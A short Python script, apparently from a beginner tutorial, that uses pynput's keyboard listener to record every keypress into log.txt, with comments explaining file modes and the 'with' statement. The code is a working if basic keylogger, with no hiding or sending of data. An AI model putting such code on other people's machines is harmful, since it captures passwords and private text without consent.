from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ' '

    if letter == 'Key.ctrl_l':
        letter = ' '

    if letter == 'Key.enter':
        letter = "\n"

    # print(letter)
    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()
    
    
# storing the keystrokes in a text file
# File Handling - How to read, write, and append to a file

# f = open("log.txt", 'a')
# filedata = f.read()
# print(filedata)
# f.write("\nI see the sun!")
# f.close()

# r - reading
# w - writing
# a - appending to a file

# Listeners - Listen to keystrokes
# Use of the 'with' keyword - Release memory / resources automatically